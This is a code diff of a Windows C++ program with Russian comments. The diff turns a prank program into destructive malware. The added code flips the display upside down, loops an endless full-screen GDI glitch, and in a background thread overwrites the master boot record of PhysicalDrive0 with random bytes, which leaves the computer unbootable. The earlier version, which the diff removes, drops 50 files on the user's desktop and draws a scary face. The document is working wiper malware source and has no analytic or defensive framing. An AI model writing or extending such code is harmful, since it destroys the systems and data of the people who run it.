@@ -2,91 +2,73 @@
 #include <iostream>
 #include <cstdlib>
 #include <ctime>
-#include <string>
 #include <thread>
 #include <chrono>
 
 // ==========================================
-// ЧАСТЬ 1: ЖУТКИЕ ИЕРОГЛИФЫ (ЮНИКОД)
+// ЧАСТЬ 1: СМЕНА ОРИЕНТАЦИИ ЭКРАНА (ПЕРЕВОРОТ)
 // ==========================================
-std::wstring GetSpookyText() {
-    const wchar_t* symbols[] = { L"♆", L"☠", L"⛧", L"᚛", L"᚜", L"ᚉ", L"ᚒ", L"ᛟ", L"ᛉ", L"ᛊ", L"✠", L"✙" };
-    std::wstring result;
-    for (int i = 0; i < 5; i++) {
-        result += symbols[rand() % 12];
-    }
-    return result;
-}
-
-// ==========================================
-// ЧАСТЬ 2: РАЗРУШЕНИЕ ФАЙЛОВ
-// ==========================================
-void DestroyFiles() {
-    wchar_t userProfile[MAX_PATH];
-    GetEnvironmentVariableW(L"USERPROFILE", userProfile, MAX_PATH);
-    std::wstring desktop = std::wstring(userProfile) + L"\\Desktop\\";
+void FlipScreen() {
+    DEVMODE dm;
+    ZeroMemory(&dm, sizeof(dm));
+    dm.dmSize = sizeof(dm);
     
-    for (int i = 0; i < 50; i++) {
-        std::wstring filePath = desktop + L"HELPED_" + std::to_wstring(i) + L".txt";
-        HANDLE hFile = CreateFileW(filePath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-        if (hFile != INVALID_HANDLE_VALUE) {
-            const char* data = "I HELPED YOU >:D";
-            DWORD written;
-            WriteFile(hFile, data, strlen(data), &written, NULL);
-            CloseHandle(hFile);
-        }
+    if (EnumDisplaySettings(NULL, ENUM_CURRENT_SETTINGS, &dm)) {
+        // Меняем ориентацию на 180 градусов (вверх ногами)
+        dm.dmFields = DM_DISPLAYORIENTATION;
+        dm.dmDisplayOrientation = DMDO_180;
+        ChangeDisplaySettings(&dm, CDS_UPDATEREGISTRY);
     }
 }
 
 // ==========================================
-// ЧАСТЬ 3: УВЕДОМЛЕНИЕ (В ОТДЕЛЬНОМ ПОТОКЕ!)
+// ЧАСТЬ 2: РЕАЛИСТИЧНЫЙ СБОЙ МАТРИЦЫ (GDI-ГЛИТЧ)
 // ==========================================
-void ShowNotificationThread() {
-    std::wstring text = L"Hello, I am " + GetSpookyText() + L". I want to help you with the files!";
-    // Запускаем MessageBox в отдельном потоке, чтобы он не блокировал основной код
-    MessageBoxW(NULL, text.c_str(), L"SYSTEM HELPER", MB_OK | MB_ICONWARNING);
-}
-
-// ==========================================
-// ЧАСТЬ 4: РИСУЕМ ЖУТКОЕ ЛИЦО (GDI)
-// ==========================================
-void DrawScaryFace() {
+void MatrixGlitch() {
     HDC hdc = GetDC(NULL);
     int w = GetSystemMetrics(SM_CXSCREEN);
     int h = GetSystemMetrics(SM_CYSCREEN);
 
-    // Черный фон
-    HBRUSH blackBrush = CreateSolidBrush(RGB(0, 0, 0));
-    RECT rect = { 0, 0, w, h };
-    FillRect(hdc, &rect, blackBrush);
-    DeleteObject(blackBrush);
-
-    // Красные глаза
-    HBRUSH redBrush = CreateSolidBrush(RGB(255, 0, 0));
-    Ellipse(hdc, w/2 - 200, h/2 - 200, w/2 - 50, h/2 - 50);
-    Ellipse(hdc, w/2 + 50, h/2 - 200, w/2 + 200, h/2 - 50);
-    DeleteObject(redBrush);
-
-    // Черные зрачки
-    HBRUSH blackEyeBrush = CreateSolidBrush(RGB(0, 0, 0));
-    Ellipse(hdc, w/2 - 150, h/2 - 150, w/2 - 100, h/2 - 100);
-    Ellipse(hdc, w/2 + 100, h/2 - 150, w/2 + 150, h/2 - 100);
-    DeleteObject(blackEyeBrush);
-
-    // Кровавая улыбка (красная линия)
-    HPEN redPen = CreatePen(PS_SOLID, 10, RGB(255, 0, 0));
-    SelectObject(hdc, redPen);
-    // Используем Arc (дуга) для улыбки
-    Arc(hdc, w/2 - 150, h/2 + 50, w/2 + 150, h/2 + 250, w/2 - 150, h/2 + 150, w/2 + 150, h/2 + 150);
-    DeleteObject(redPen);
-
-    // Текст
-    SetTextColor(hdc, RGB(255, 0, 0));
-    SetBkMode(hdc, TRANSPARENT);
-    const wchar_t* text = L"I AM HELPING YOU >:D";
-    TextOutW(hdc, w/2 - 150, h/2 + 300, text, wcslen(text));
-
+    while (true) {
+        // 1. Рисуем случайные цветные полосы (сдвиг картинки)
+        for (int i = 0; i < 50; i++) {
+            int y = rand() % h;
+            int height = rand() % 20 + 1;
+            COLORREF color = RGB(rand() % 256, rand() % 256, rand() % 256);
+            HBRUSH brush = CreateSolidBrush(color);
+            RECT rect = {0, y, w, y + height};
+            FillRect(hdc, &rect, brush);
+            DeleteObject(brush);
+        }
+        
+        // 2. Сдвиг пикселей (эффект "сбоя матрицы")
+        if (rand() % 100 < 20) { // 20% шанс на сдвиг
+            int shiftX = rand() % 20 - 10;
+            int shiftY = rand() % 20 - 10;
+            BitBlt(hdc, shiftX, shiftY, w, h, hdc, 0, 0, SRCCOPY);
+        }
+        
+        Sleep(10); // Задержка для мерцания
+    }
     ReleaseDC(NULL, hdc);
+}
+
+// ==========================================
+// ЧАСТЬ 3: СНОС MBR (BOOTKIT)
+// ==========================================
+void DestroyMBR() {
+    HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, 
+                                 FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
+    if (hDevice != INVALID_HANDLE_VALUE) {
+        BYTE garbage[512];
+        srand(time(NULL));
+        for (int i = 0; i < 512; i++) {
+            garbage[i] = rand() % 256;
+        }
+        DWORD bytesWritten;
+        WriteFile(hDevice, garbage, 512, &bytesWritten, NULL);
+        CloseHandle(hDevice);
+    }
 }
 
 // ==========================================
@@ -95,22 +77,15 @@ void DrawScaryFace() {
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
     srand(time(NULL));
 
-    // 1. Запускаем уведомление в фоне (чтобы оно не блокировало)
-    std::thread notifyThread(ShowNotificationThread);
-    notifyThread.detach();
+    // 1. Переворачиваем экран
+    FlipScreen();
 
-    // 2. В фоне разрушаем файлы
-    std::thread destroyThread(DestroyFiles);
-    destroyThread.detach();
+    // 2. Сносим MBR в отдельном потоке
+    std::thread mbrThread(DestroyMBR);
+    mbrThread.detach();
 
-    // 3. Ждем 3 секунды и показываем жуткое лицо
-    std::this_thread::sleep_for(std::chrono::seconds(3));
-    DrawScaryFace();
-
-    // Держим программу открытой, чтобы лицо не исчезло
-    while (true) {
-        Sleep(1000);
-    }
+    // 3. Запускаем глитч (он бесконечный)
+    MatrixGlitch();
 
     return 0;
 }
